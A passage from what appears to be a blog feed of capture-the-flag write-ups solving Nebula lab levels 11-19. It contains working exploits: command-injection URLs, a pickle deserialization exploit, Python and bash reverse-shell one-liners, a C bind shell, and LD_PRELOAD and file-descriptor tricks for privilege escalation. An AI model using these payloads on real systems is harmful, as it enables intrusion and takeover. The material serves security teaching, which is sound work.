<a href="http://192.168.80.136:1616/index.cgi?username=$">http://192.168.80.136:1616/index.cgi?username=$</a>(CMD=YES;${CMD~~})&amp;password
<a href="http://192.168.80.136:1616/index.cgi?username=$">http://192.168.80.136:1616/index.cgi?username=$</a>($SHELL)&amp;password
{% endcodeblock %}</p>

<p>Our solution was to create uppercased file in /tmp/ and use * expansion, telling bash to find the correct directory.</p>

<p>{% codeblock %}
sh-4.2$ cat SH
python -c &ldquo;import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(&lsquo;/bin/bash&rsquo;)&rdquo; nebula 1337</p>

<p>sh-4.2$ chmod +x SH</p>

<p>sh-4.2$ nc -l 1337</p>

<h1><a href="http://192.168.80.136:1616/index.cgi?username=$">http://192.168.80.136:1616/index.cgi?username=$</a>(/*/SH)</h1>

<p>sh-4.2$ wget -q -O /dev/null &ldquo;<a href="http://192.168.80.136:1616/index.cgi?username=%24">http://192.168.80.136:1616/index.cgi?username=%24</a>(/%2A/SH)</p>

<p>flag16@nebula:/home/flag16$ getflag
getflag
You have successfully executed getflag on a target account
{% endcodeblock %}</p>

<h2>Level17</h2>

<p>{% codeblock lang:py level17.py %}</p>

<h1>!/usr/bin/python</h1>

<p>import os
import pickle
import time
import socket
import signal</p>

<p>signal.signal(signal.SIGCHLD, signal.SIG_IGN)</p>

<p>def server(skt):
  line = skt.recv(1024)</p>

<p>  obj = pickle.loads(line)</p>

<p>  for i in obj:
      clnt.send(&ldquo;why did you send me &rdquo; + i + &ldquo;?\n&rdquo;)</p>

<p>skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind((&lsquo;0.0.0.0&rsquo;, 10007))
skt.listen(10)</p>

<p>while True:
  clnt, addr = skt.accept()</p>

<p>  if(os.fork() == 0):
      clnt.send(&ldquo;Accepted connection from %s:%d&rdquo; % (addr[0], addr[1]))
      server(clnt)
      exit(1)
{% endcodeblock %}</p>

<p>According <a href="https://docs.python.org/2/library/pickle.html">documentation</a> it is
not safe to use data from untrusted source, so <code>pickle.loads</code> on line 14 means RCE:</p>

<p><code>Warning The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.</code></p>

<p>Our exploit for executing remote shell:</p>

<p>{% codeblock lang:python exploit.py %}</p>

<h1>!/usr/bin/env python</h1>

<p>from cPickle import dumps
from os      import system</p>

<p>class Exploit(object):
    def <strong>reduce</strong>(self): return (system, (&lsquo;bash -i >&amp; /dev/tcp/0.0.0.0/1337 0>&amp;1&rsquo;,))</p>

<p>print dumps(Exploit())
{% endcodeblock %}</p>

<p>{% codeblock %}</p>

<h1>Window 1:</h1>

<p>sh-4.2$ nc -l 1337</p>

<h1>Window 2:</h1>

<p>sh-4.2$ ./exploit.py
cposix
system
p1
(S&#8217;bash -i >&amp; /dev/tcp/0.0.0.0/1337 0>&amp;1&#8217;
p2
tp3
Rp4
.</p>

<p>sh-4.2$ ./exploit.py | nc nebula 10007
Accepted connection from 127.0.0.1:42532</p>

<h1>Window 1:</h1>

<p>bash: no job control in this shell
flag17@nebula:/$ getflag
getflag
You have successfully executed getflag on a target account
{% endcodeblock %}</p>

<h2>Level18</h2>

<p>According challenge info, there are several ways how to solve this challenge.</p>

<p>{% codeblock lang:c level18.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;fcntl.h></h1>

<h1>include &lt;getopt.h></h1>

<p>struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;</p>

<h1>define dprintf(&hellip;) if(globals.debugfile) \</h1>

<p>  fprintf(globals.debugfile, <strong>VA_ARGS</strong>)</p>

<h1>define dvprintf(num, &hellip;) if(globals.debugfile &amp;&amp; globals.verbose >= num) \</h1>

<p>  fprintf(globals.debugfile, <strong>VA_ARGS</strong>)</p>

<h1>define PWFILE &ldquo;/home/flag18/password&rdquo;</h1>

<p>void login(char <em>pw)
{
  FILE </em>fp;</p>

<p>  fp = fopen(PWFILE, &ldquo;r&rdquo;);
  if(fp) {
      char file[64];</p>

<pre><code>  if(fgets(file, sizeof(file) - 1, fp) == NULL) {
      dprintf("Unable to read password file %s\n", PWFILE);
      return;
  }
            fclose(fp);
  if(strcmp(pw, file) != 0) return;       
</code></pre>

<p>  }
  dprintf(&ldquo;logged in successfully (with%s password file)\n&rdquo;,
      fp == NULL ? &ldquo;out&rdquo; : &ldquo;&rdquo;);</p>

<p>  globals.loggedin = 1;</p>

<p>}</p>

<p>void notsupported(char <em>what)
{
  char </em>buffer = NULL;
  asprintf(&amp;buffer, &ldquo;&ndash;> [%s] is unsupported at this current time.\n&rdquo;, what);
  dprintf(what);
  free(buffer);
}</p>

<p>void setuser(char *user)
{
  char msg[128];</p>

<p>  sprintf(msg, &ldquo;unable to set user to &lsquo;%s&rsquo; &ndash; not supported.\n&rdquo;, user);
  printf(&ldquo;%s\n&rdquo;, msg);</p>

<p>}</p>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  char c;</p>

<p>  while((c = getopt(argc, argv, &ldquo;d:v&rdquo;)) != -1) {
      switch&copy; {
          case &rsquo;d&#8217;:
              globals.debugfile = fopen(optarg, &ldquo;w+&rdquo;);
              if(globals.debugfile == NULL) err(1, &ldquo;Unable to open %s&rdquo;, optarg);
              setvbuf(globals.debugfile, NULL, _IONBF, 0);
              break;
          case &lsquo;v&rsquo;:
              globals.verbose++;
              break;
      }
  }</p>

<p>  dprintf(&ldquo;Starting up. Verbose level = %d\n&rdquo;, globals.verbose);</p>

<p>  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());</p>

<p>  while(1) {
      char line[256];
      char <em>p, </em>q;</p>

<pre><code>  q = fgets(line, sizeof(line)-1, stdin);
  if(q == NULL) break;
  p = strchr(line, '\n'); if(p) *p = 0;
  p = strchr(line, '\r'); if(p) *p = 0;

  dvprintf(2, "got [%s] as input\n", line);

  if(strncmp(line, "login", 5) == 0) {
      dvprintf(3, "attempting to login\n");
      login(line + 6);
  } else if(strncmp(line, "logout", 6) == 0) {
      globals.loggedin = 0;
  } else if(strncmp(line, "shell", 5) == 0) {
      dvprintf(3, "attempting to start shell\n");
      if(globals.loggedin) {
          execve("/bin/sh", argv, envp);
          err(1, "unable to execve");
      }
      dprintf("Permission denied\n");
  } else if(strncmp(line, "logout", 4) == 0) {
      globals.loggedin = 0;
  } else if(strncmp(line, "closelog", 8) == 0) {
      if(globals.debugfile) fclose(globals.debugfile);
      globals.debugfile = NULL;
  } else if(strncmp(line, "site exec", 9) == 0) {
      notsupported(line + 10);
  } else if(strncmp(line, "setuser", 7) == 0) {
      setuser(line + 8);
  }
</code></pre>

<p>  }</p>

<p>  return 0;
}
{% endcodeblock %}</p>

<p>First thing that we tried was to use parameter <code>-d /home/flag18/password</code> to
rewrite password file with the known output, however the <code>strcmp()</code> doesn&rsquo;t match
for the reason that we cannot insert the newline character to the end of our string.</p>

<p>The <code>fclose()</code> on line 34 is not aligned, that&rsquo;s strange. We found out that this call is not used in the binary file:</p>

<p>{% codeblock %}
sh-4.2$ gdb -batch -ex &lsquo;file /home/flag18/flag18&rsquo; -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;disassemble login&rsquo; | grep close
sh-4.2$
{% endcodeblock %}</p>

<p>We can use login function to exhaust file descriptors, because when the <code>fopen()</code> fails, we will be logged in. After a few tries:</p>

<p>{% codeblock %}
sh-4.2$ help ulimit
[..snip..]
      -n        the maximum number of open file descriptors
[..snip..]</p>

<p>sh-4.2$ ulimit -n 8</p>

<p>sh-4.2$ /home/flag18/flag18 -d /dev/tty -vvv
Starting up. Verbose level = 3
login
got [login] as input
attempting to login
login
got [login] as input
attempting to login
login
got [login] as input
attempting to login
login
got [login] as input
attempting to login
login
got [login] as input
attempting to login
logged in successfully (without password file)
closelog
got [closelog] as input
shell
/home/flag18/flag18: -d: invalid option
Usage:  /home/flag18/flag18 [GNU long option] [option] &hellip;
        /home/flag18/flag18 [GNU long option] [option] script-file &hellip;
GNU long options:
        &ndash;debug
        &ndash;debugger
        &ndash;dump-po-strings
        &ndash;dump-strings
        &ndash;help
        &ndash;init-file
        &ndash;login
        &ndash;noediting
        &ndash;noprofile
        &ndash;norc
        &ndash;posix
        &ndash;protected
        &ndash;rcfile
        &ndash;restricted
        &ndash;verbose
        &ndash;version
Shell options:
        -irsD or -c command or -O shopt_option          (invocation only)
        -abefhkmnptuvxBCHP or -o option
{% endcodeblock %}</p>

<p>We used <code>closelog</code> to close one used descriptor and the shell is invoked,
unfortunately we need to get rid of -d parameter too, bash is recycling
our argv, see <code>execve("/bin/sh", argv, envp);</code>.</p>

<p>We tried <code>--init-file</code> as it has the second argument some file:</p>

<p>{% codeblock %}
sh-4.2$ ulimit -n 5</p>

<p>sh-4.2$ /home/flag18/flag18 &ndash;init-file -d /dev/tty -vvv
/home/flag18/flag18: invalid option &ndash; &lsquo;-&rsquo;
/home/flag18/flag18: invalid option &ndash; &lsquo;i&rsquo;
/home/flag18/flag18: invalid option &ndash; &lsquo;n&rsquo;
/home/flag18/flag18: invalid option &ndash; &lsquo;i&rsquo;
/home/flag18/flag18: invalid option &ndash; &rsquo;t&#8217;
/home/flag18/flag18: invalid option &ndash; &lsquo;-&rsquo;
/home/flag18/flag18: invalid option &ndash; &lsquo;f&rsquo;
/home/flag18/flag18: invalid option &ndash; &lsquo;i&rsquo;
/home/flag18/flag18: invalid option &ndash; &lsquo;l&rsquo;
/home/flag18/flag18: invalid option &ndash; &lsquo;e&rsquo;
Starting up. Verbose level = 3
login
got [login] as input
attempting to login
login
got [login] as input
attempting to login
logged in successfully (without password file)
closelog
got [closelog] as input
shell
id
uid=981(flag18) gid=1019(level18) groups=981(flag18),1019(level18)
getflag
You have successfully executed getflag on a target account
{% endcodeblock %}</p>

<p>Second way is to use format string exploitation, line 48 is vulnerable at <code>notsupported()</code> function.</p>

<p>For debugging, we downloaded <code>gdb-peda</code>:</p>

<p>{% codeblock %}
git clone <a href="https://github.com/longld/peda.git">https://github.com/longld/peda.git</a> ~/peda
echo &ldquo;source ~/peda/peda.py&rdquo; >> ~/.gdbinit
{% endcodeblock %}</p>

<p>{% codeblock %}
level18@nebula:/tmp$ gdb -q /home/flag18/flag18
Reading symbols from /home/flag18/flag18&hellip;(no debugging symbols found)&hellip;done.</p>

<p>gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
{% endcodeblock %}</p>

<p>Because the Fortify2, there was no easy way to solve it, technique from
<a href="http://phrack.org/issues/67/9.html">phrack #67</a> could be very useful.</p>

<p>There is also buffer overflow in <code>setuser()</code> function, that doesn&rsquo;t seem to be exploitable.</p>

<h2>Level19</h2>

<p>{% codeblock lang:c level19.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;fcntl.h></h1>

<h1>include &lt;sys/stat.h></h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;</p>

<p>  /<em> Get the parent&rsquo;s /proc entry, so we can verify its user id </em>/</p>

<p>  snprintf(buf, sizeof(buf)-1, &ldquo;/proc/%d&rdquo;, getppid());</p>

<p>  /<em> stat() it </em>/</p>

<p>  if(stat(buf, &amp;statbuf) == -1) {
      printf(&ldquo;Unable to check parent process\n&rdquo;);
      exit(EXIT_FAILURE);
  }</p>

<p>  /<em> check the owner id </em>/</p>

<p>  if(statbuf.st_uid == 0) {
      /<em> If root started us, it is ok to start the shell </em>/</p>

<pre><code>  execve("/bin/sh", argv, envp);
  err(1, "Unable to execve");
</code></pre>

<p>  }</p>

<p>  printf(&ldquo;You are unauthorized to run this program\n&rdquo;);
}
{% endcodeblock %}</p>

<p>To pass the last challenge, our process parent id should match uid 0. This
could be easily achieved when the parent dies and the orphan process is adopted
by init.</p>

<p>{% codeblock %}
man 2 wait</p>

<p>  A child that terminates, but has not been waited for becomes a &ldquo;zombie&rdquo;.  The
  kernel maintains a minimal set of information about the zombie process (PID,
  termination status, resource usage information) in order to allow the parent to
  later perform a wait to obtain information about the child.  As long as a
  zombie  is  not  removed from  the  system  via a wait, it will consume a slot
  in the kernel process table, and if this table fills, it will not be possible
  to create further processes.  If a parent process terminates, then its &ldquo;zombie&rdquo;
  children (if any) are adopted by init(8), which automatically performs a wait
  to remove the zombies.<br/>
{% endcodeblock %}</p>

<p>Exploit:
{% codeblock lang:c exploit19.c %}</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main(int argc, char * argv) {</p>

<pre><code>pid_t childpid = fork();

if (childpid == 0) { /* child */
    char *cmd = "/home/flag19/flag19";
    char *argv[] = { "/bin/sh", "-c", "/tmp/bindshell" };

    sleep(3);
    execv(cmd, argv);
} else { sleep(1); exit(1); }
</code></pre>

<p>}
{% endcodeblock %}</p>

<p>Binding shell to port 2448, binary will be called from exploit.
{% codeblock lang:c bindshell.c %}</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;sys/socket.h></h1>

<h1>include &lt;netinet/in.h></h1>

<p>int main(int argc, char **argv)
{
        int sockfd;
        int clientfd;
        socklen_t cli_len;</p>

<pre><code>    struct sockaddr_in srv_addr;
    struct sockaddr_in cli_addr;

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(2448);
    srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

    bind(sockfd, (struct sockaddr *)&amp;srv_addr, sizeof(srv_addr));
    listen(sockfd, 0);

    /* accept new connections */
    cli_len = sizeof(cli_addr)-1;
    clientfd = accept(sockfd, (struct sockaddr *)&amp;cli_addr, &amp;cli_len );

    dup2(clientfd, 0); /* replace 0 with clientfd */
    dup2(0, 1);        /* replace stdout &amp; stderr */
    dup2(0, 2); 

    setreuid(geteuid(), geteuid());

    execv("/bin/sh", NULL);
</code></pre>

<p>}
{% endcodeblock %}</p>

<p>{% codeblock %}
sh-4.2$ cd /tmp</p>

<p>sh-4.2$ gcc bindshell.c -o bindshell</p>

<p>sh-4.2$ gcc exploit19.c -o exploit19</p>

<p>sh-4.2$ ./exploit19</p>

<p>sh-4.2$ nc 0 2448
id
uid=980(flag19) gid=1020(level19) groups=980(flag19),1020(level19)
getflag
You have successfully executed getflag on a target account
{% endcodeblock %}</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Nebula (11-15)]]></title>
    <link href="http://73696e65.github.io/blog/2015/06/18/exploit-exercises-nebula-11-15/"/>
    <updated>2015-06-18T19:13:09+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/06/18/exploit-exercises-nebula-11-15</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-nebula-v5,31/">Exploit-Exercises: Nebula (v5)</a></p>

<h2>Level11</h2>

<p>According to the assignment, there should be two ways how to exploit the source below.
{% codeblock lang:c level11.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;fcntl.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/mman.h></h1>

<p>/<em>
 * Return a random, non predictable file, and return the file descriptor for it.
 </em>/</p>

<p>int getrand(char <em>*path)
{
  char </em>tmp;
  int pid;
  int fd;</p>

<p>  srandom(time(NULL));</p>

<p>  tmp = getenv(&ldquo;TEMP&rdquo;);
  pid = getpid();</p>

<p>  asprintf(path, &ldquo;%s/%d.%c%c%c%c%c%c&rdquo;, tmp, pid,
      &lsquo;A&rsquo; + (random() % 26), &lsquo;0&rsquo; + (random() % 10),
      &lsquo;a&rsquo; + (random() % 26), &lsquo;A&rsquo; + (random() % 26),
      &lsquo;0&rsquo; + (random() % 10), &lsquo;a&rsquo; + (random() % 26));</p>

<p>  fd = open(<em>path, O_CREAT|O_RDWR, 0600);
  unlink(</em>path);
  return fd;
}</p>

<p>void process(char *buffer, int length)
{
  unsigned int key;
  int i;</p>

<p>  key = length &amp; 0xff;</p>

<p>  for(i = 0; i &lt; length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }</p>

<p>  system(buffer);
}</p>

<h1>define CL &ldquo;Content-Length: &rdquo;</h1>

<p>int main(int argc, char <em><em>argv)
{
  char line[256];
  char buf[1024];
  char </em>mem;
  int length;
  int fd;
  char </em>path;</p>

<p>  if(fgets(line, sizeof(line), stdin) == NULL) {
      errx(1, &ldquo;reading from stdin&rdquo;);
  }</p>

<p>  if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, &ldquo;invalid header&rdquo;);
  }</p>

<p>  length = atoi(line + strlen(CL));</p>

<p>  if(length &lt; sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, &ldquo;fread length&rdquo;);
      }
      process(buf, length);
  } else {
      int blue = length;
      int pink;</p>

<pre><code>  fd = getrand(&amp;path);

  while(blue &gt; 0) {
      printf("blue = %d, length = %d, ", blue, length);

      pink = fread(buf, 1, sizeof(buf), stdin);
      printf("pink = %d\n", pink);

      if(pink &lt;= 0) {
          err(1, "fread fail(blue = %d, length = %d)", blue, length);
      }
      write(fd, buf, pink);

      blue -= pink;
  }    

  mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
  if(mem == MAP_FAILED) {
      err(1, "mmap");
  }
  process(mem, length);
</code></pre>

<p>  }</p>

<p>}
{% endcodeblock %}</p>

<p>The <code>fread(buf, length, 1, stdin)</code> always returns 1 as we can read in the unix manual:
<code>fread()  and  fwrite()  return the number of items successfully read or written (i.e., not the number of characters).</code></p>

<p>Here <code>if(length &lt; sizeof(buf)) {</code> we have two ways to progress. I suppose
having two solutions means calling <code>process()</code> from the different parts of code.</p>

<p>The first way is setting &ldquo;Content-Length: 1&rdquo;. The buffer is XORed using the simple algorithm below, this time the &lsquo;for&rsquo; cycle runs only once.
{% codeblock lang:c %}
  key = length &amp; 0xff;</p>

<p>  for(i = 0; i &lt; length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }
{% endcodeblock %}</p>

<p>{% codeblock %}
sh-4.2$ ruby -e &lsquo;print &ldquo;Content-Length: 1\nA&rdquo;&rsquo; | /home/flag11/flag11
sh: @: command not found</p>

<p>sh-4.2$ ruby -e &lsquo;print &ldquo;Content-Length: 1\n&rdquo; + (&ldquo;A&rdquo;.ord ^ 0x01).chr&rsquo;  | /home/flag11/flag11
sh: $&lsquo;A\300Q&rsquo;: command not found</p>

<p>sh-4.2$ ruby -e &lsquo;print &ldquo;Content-Length: 1\n&rdquo; + (&ldquo;A&rdquo;.ord ^ 0x01).chr&rsquo;  | /home/flag11/flag11
sh: -c: line 0: unexpected EOF while looking for matching &#8220;&lsquo;
sh: -c: line 1: syntax error: unexpected end of file</p>

<p>sh-4.2$ ruby -e &lsquo;print &ldquo;Content-Length: 1\n&rdquo; + (&ldquo;A&rdquo;.ord ^ 0x01).chr&rsquo;  | /home/flag11/flag11
sh: A: command not found
{% endcodeblock %}</p>

<p>Because the buffer with &lsquo;A&rsquo; character is not NULL terminated and contains
uninitialized data, we use the technique described here <a href="http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/">Controlling uninitialized memory with LD_PRELOAD</a>
to have more luck with terminating &lsquo;A&rsquo;.</p>

<p>{% codeblock %}
sh-4.2$ ln -sf /bin/getflag /tmp/A
sh-4.2$ export PATH=/tmp:$PATH</p>

<p>sh-4.2$ export LD_PRELOAD=$(ruby -e &lsquo;print &ldquo;\n&rdquo; * 50&rsquo;)</p>

<p>sh-4.2$ ruby -e &lsquo;print &ldquo;Content-Length: 1\n&rdquo; + (&ldquo;A&rdquo;.ord ^ 0x01).chr&rsquo;  | /home/flag11/flag11
getflag is executing on a non-flag account, this doesn&rsquo;t count
{% endcodeblock %}</p>

<p>The getflag runs, albeit there is a bug in the binary, because the new process
is created using <code>system()</code>, so it wasn&rsquo;t possible to get flag11 privileges.</p>

<p>{% codeblock %}
man 3 system</p>

<p>  Do not use system() from a program with set-user-ID or set-group-ID privileges,
  because strange values for some environment variables might be used to subvert
  system integrity. Use the exec(3) family of functions instead, but not
  execlp(3) or execvp(3). system() will not, in fact, work properly from
  programs with set-user-ID or set-group-ID privileges on systems on which
  /bin/sh is bash version 2, since bash 2 drops privileges on startup. (Debian
  uses a modified bash which does not do this when invoked as sh.)
{% endcodeblock %}</p>

<p>The second way is to use input with the length at least 1024. The decryption
routine is almost symmetric. However, in this step <code>key -= buffer[i];</code> we need
to substract from key the original value, so we XOR it with the key again.</p>

<p>{% codeblock lang:c exploit11.c %}</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<p>int main(int argc, char **argv) {</p>

<pre><code>unsigned int key;
int i, length = 1024;
char buffer[1024] = {0}; 
char cmd[] = "/bin/getflag";
int  cmd_length = strlen(cmd);

memcpy(buffer, cmd, cmd_length);

key = length &amp; 0xff;

for (i = 0; i &lt;= cmd_length; i++) {
    buffer[i] ^= key;
    key -= buffer[i] ^ key;
}   

fprintf(stdout, "Content-Length: 1024\n");
fwrite(buffer, 1, length, stdout);

return 0;
</code></pre>

<p>}
{% endcodeblock %}</p>

<p>{% codeblock %}
sh-4.2$ export TEMP=/tmp
sh-4.2$ ./exploit11 | /home/flag11/flag11
blue = 1024, length = 1024, pink = 1024
getflag is executing on a non-flag account, this doesn&rsquo;t count
{% endcodeblock %}</p>

<h2>Level12</h2>

<p>The code below should be backdoored:</p>

<p>{% codeblock lang:lua level12.lua%}
local socket = require(&ldquo;socket&rdquo;)
local server = assert(socket.bind(&ldquo;127.0.0.1&rdquo;, 50001))</p>

<p>function hash(password)
  prog = io.popen(&ldquo;echo &rdquo;..password..&ldquo; | sha1sum&rdquo;, &ldquo;r&rdquo;)
  data = prog:read(&ldquo;*all&rdquo;)
  prog:close()</p>

<p>  data = string.sub(data, 1, 40)</p>

<p>  return data
end</p>

<p>while 1 do
  local client = server:accept()
  client:send(&ldquo;Password: &rdquo;)
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
      print(&ldquo;trying &rdquo; .. line) &ndash; log from where ;\
      local h = hash(line)</p>

<pre><code>  if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
      client:send("Better luck next time\n");
  else
      client:send("Congrats, your token is 413**CARRIER LOST**\n")
  end
</code></pre>

<p>  end</p>

<p>  client:close()
end
{% endcodeblock %}</p>

<p>With <code>io.popen</code> we can invoke arbitrary command using several techniques. We
use command substitution and two screens to gain reverse shell using bash:</p>

<p>{% codeblock %}
Window1:
sh-4.2$ nc -l 1337</p>

<p>Window2:
sh-4.2$ nc 0 50001
Password: $(bash -i >&amp; /dev/tcp/0.0.0.0/1337 0>&amp;1)</p>

<p>Window1:
bash: no job control in this shell
flag12@nebula:/$ id
id
uid=987(flag12) gid=987(flag12) groups=987(flag12)</p>

<p>flag12@nebula:/$ getflag
getflag
You have successfully executed getflag on a target account
{% endcodeblock %}</p>

<h2>Level13</h2>

<p>The vulnerable program checks if the user does match the specific user id.</p>

<p>{% codeblock lang:c leve13_safe.c %}</p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;string.h></h1>

<h1>define FAKEUID 1000</h1>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  int c;
  char token[256];</p>

<p>  if(getuid() != FAKEUID) {
      printf(&ldquo;Security failure detected. UID %d started us, we expect %d\n&rdquo;, getuid(), FAKEUID);
      printf(&ldquo;The system administrators will be notified of this violation\n&rdquo;);
      exit(EXIT_FAILURE);
  }</p>

<p>  // snip, sorry :)</p>

<p>  printf(&ldquo;your token is %s\n&rdquo;, token);</p>

<p>}
{% endcodeblock %}</p>

<p>{% codeblock %}
level13@nebula:/home/flag13$ objdump -M intel flag13 -d | grep 0x3e8
 80484f4:       3d e8 03 00 00          cmp    eax,0x3e8
 8048505:       c7 44 24 08 e8 03 00    mov    DWORD PTR [esp+0x8],0x3e8
{% endcodeblock %}</p>

<p>Because we know where the value 0x3e8 = 1000 is used to compare with eax, now
we need only to tamper this value:</p>

<p>{% codeblock %}
level13@nebula:/home/flag13$ gdb ./flag13 -q
Reading symbols from /home/flag13/flag13&hellip;(no debugging symbols found)&hellip;done.</p>

<p>(gdb) set disassembly-flavor intel</p>

<p>(gdb) b *0x80484f4
Breakpoint 1 at 0x80484f4</p>

<p>(gdb) r
Starting program: /home/flag13/flag13
Breakpoint 1, 0x080484f4 in main ()</p>

<p>(gdb) i r eax
eax            0x3f6    1014</p>

<p>(gdb) set $eax = 1000</p>

<p>(gdb) i r eax
eax            0x3e8    1000</p>

<p>(gdb) c
Continuing.
your token is b705702b-76a8-42b0-8844-3adabbe5ac58</p>

<p>level13@nebula:/home/flag13$ su flag13
Password:
sh-4.2$ getflag
You have successfully executed getflag on a target account
{% endcodeblock %}</p>

<p>As another solution we use the PRELOAD library. We use the copy of flag13,
because the restriction with invoking preload with suid binaries.</p>

<p>{% codeblock %}
level13@nebula:/tmp$ cat fakeuid.c</p>

<h1>include &lt;sys/types.h></h1>

<p>uid_t getuid(void) { return 1000; }</p>

<p>level13@nebula:/tmp$ gcc -shared -fPIC fakeuid.c -o fakeuid.so</p>

<p>level13@nebula:/tmp$ cp /home/flag13/flag13 .</p>

<p>level13@nebula:/tmp$ LD_PRELOAD=./fakeuid.so ./flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
{% endcodeblock %}</p>

<h2>Level14</h2>

<p>The encryption process is trivial, on each byte position, the
/home/flag14/flag14 add the position index to the ascii value of the character,
started by 0, see:</p>

<p>{% codeblock %}
level14@nebula:/home/flag14$ ruby -e &lsquo;print &ldquo;\x01\x02\x03\x04&rdquo;&rsquo; | ./flag14 -e | hexdump -C
00000000  01 03 05 07                                       |&hellip;.|
00000004
level14@nebula:/home/flag14$ ruby -e &lsquo;print &ldquo;\xff\xff\xff\xff&rdquo;&rsquo; | ./flag14 -e | hexdump -C
00000000  ff 00 01 02                                       |&hellip;.|
00000004
{% endcodeblock %}</p>

<p>Now we use the reverse process to decrypt the token:
{% codeblock lang:console %}
level14@nebula:/home/flag14$ ruby -pe &lsquo;puts $_[0..-3].force_encoding(&ldquo;iso-8859-1&rdquo;).split(//).each_with_index.map {|x,i| (x.ord-i).chr}.join&rsquo; &lt; token
8457c118-887c-4e40-a5a6-33a25353165
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.</p>

<p>level14@nebula:/home/flag14$ su flag14
Password:</p>

<p>sh-4.2$ getflag
You have successfully executed getflag on a target account
{% endcodeblock %}</p>

<h2>Level15</h2>

<p>From strace output we can see that the binary is trying to link shared library from <code>/var/tmp/flag15</code> directory:
{% codeblock lang:console %}
level15@nebula:/tmp$ strace -f /home/flag15/flag15
execve(&ldquo;/home/flag15/flag15&rdquo;, [&ldquo;/home/flag15/flag15&rdquo;], [/<em> 21 vars </em>/]) = 0
brk(0)                                  = 0x8b1f000
access(&ldquo;/etc/ld.so.nohwcap&rdquo;, F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb784c000
access(&ldquo;/etc/ld.so.preload&rdquo;, R_OK)      = -1 ENOENT (No such file or directory)
open(&ldquo;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&ldquo;/var/tmp/flag15/tls/i686/sse2/cmov&rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)
open(&ldquo;/var/tmp/flag15/tls/i686/sse2/libc.so.6&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&ldquo;/var/tmp/flag15/tls/i686/sse2&rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)
open(&ldquo;/var/tmp/flag15/tls/i686/cmov/libc.so.6&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&ldquo;/var/tmp/flag15/tls/i686/cmov&rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)
open(&ldquo;/var/tmp/flag15/tls/i686/libc.so.6&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&ldquo;/var/tmp/flag15/tls/i686&rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)
open(&ldquo;/var/tmp/flag15/tls/sse2/cmov/libc.so.6&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&ldquo;/var/tmp/flag15/tls/sse2/cmov&rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)
open(&ldquo;/var/tmp/flag15/tls/sse2/libc.so.6&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&ldquo;/var/tmp/flag15/tls/sse2&rdquo;, 0xbf8a8bb4) = -1 ENOENT (No such file or directory)
open(&ldquo;/var/tmp/flag15/tls/cmov/libc.so.6&rdquo;, O_RDONLY) = -1 ENOENT (No such file or directory)
